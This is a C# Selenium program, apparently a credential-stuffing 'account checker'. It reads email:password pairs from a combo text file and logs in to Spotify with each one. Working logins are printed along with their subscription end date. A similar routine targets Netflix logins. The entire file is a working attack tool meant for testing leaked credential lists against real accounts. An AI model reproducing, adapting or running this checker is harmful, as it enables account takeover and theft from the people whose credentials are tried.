using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Account_Check
{
    class Program
    {
        static void Main(string[] args)
        {
            string text;
            var fileStream = new FileStream(@"C:\Users\kmtur\Desktop\spotify.txt", FileMode.Open, FileAccess.Read);
            using (var streamReader = new StreamReader(fileStream, Encoding.UTF8))
            {
                text = streamReader.ReadToEnd();
            }
            string[] stringSeparators = new string[] { "\r\n" };
            var accCombo = text.Split(stringSeparators, StringSplitOptions.None).ToList();
            var accPass = new List<KeyValuePair<string, string>>();
            foreach (var item in accCombo)
            {
                var accountPasword = item.Split(':');
                accPass.Add(new KeyValuePair<string, string>(accountPasword[0].Trim(), accountPasword[1].Trim()));
            }
            
            IWebDriver driver = new ChromeDriver();
            //driver.Navigate().GoToUrl("https://www.netflix.com/tr/login");
            driver.Navigate().GoToUrl("https://accounts.spotify.com/tr/login/?continue=https:%2F%2Fwww.spotify.com%2Ftr%2Faccount%2Foverview%2F&_locale=tr-TR");
            
            foreach (var item in accPass)
            {
                Spotify(driver, item);
            }
            Console.ReadLine();
            driver.Quit();
        }

        private static void Netflix(IWebDriver driver, KeyValuePair<string, string> item)
        {
            driver.FindElement(By.Name("userLoginId")).Clear();
            driver.FindElement(By.Name("password")).Clear();
            driver.FindElement(By.Name("userLoginId")).SendKeys(item.Key);
            driver.FindElement(By.Name("password")).SendKeys(item.Value);
            driver.FindElement(By.XPath("//*[@id='appMountPoint']/div/div[3]/div/div/div[1]/form/button")).Click();
            var errorXPath = driver.FindElement(By.XPath("//*[@id='appMountPoint']/div/div[3]/div/div/div[1]/div/div[2]"));

            Console.WriteLine("{0} : {1} Error : {2}", item.Key, item.Value, errorXPath.Text);
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
            driver.FindElement(By.Name("userLoginId")).Clear();
            driver.FindElement(By.Name("password")).Clear();
        }
        private static void Spotify(IWebDriver driver, KeyValuePair<string, string> item)
        {
            driver.FindElement(By.Name("username")).Clear();
            driver.FindElement(By.Name("password")).Clear();
            driver.FindElement(By.Name("username")).SendKeys(item.Key);
            driver.FindElement(By.Name("password")).SendKeys(item.Value);
            driver.FindElement(By.Id("login-button")).Click();
            System.Threading.Thread.Sleep(2000);
            string endDate = "";
            //driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(2000);
            try
            {
               endDate = driver.FindElement(By.XPath("//*[@id='your - plan']/section/div/div[1]/div[1]/span")).Text;
            }
            catch
            {
                endDate = "";
            }
            
            
           
            
           
            try
            {
                var failedAccount = driver.FindElement(By.XPath("//*[@id='app']/body/div[1]/div[2]/div/div[2]/div/p/span")).Text;
                
                //Console.WriteLine("{0} : {1} Error : {2}", item.Key, item.Value, failedAccount.Text);
            }
            catch 
            {
                endDate = driver.FindElement(By.XPath("//*[@id='your-plan']/section/div/div[1]/div[1]/span")).Text;
                Console.WriteLine("{0} : {1} | Success : {2} | End Date = ", item.Key, item.Value, endDate);
                driver.Navigate().GoToUrl("https://www.spotify.com/tr/logout");
                driver.Navigate().GoToUrl("https://accounts.spotify.com/tr/login/?continue=https:%2F%2Fwww.spotify.com%2Ftr%2Faccount%2Foverview%2F&_locale=tr-TR");
            }

            driver.FindElement(By.Name("username")).Clear();
            driver.FindElement(By.Name("password")).Clear();
        }
    }
}
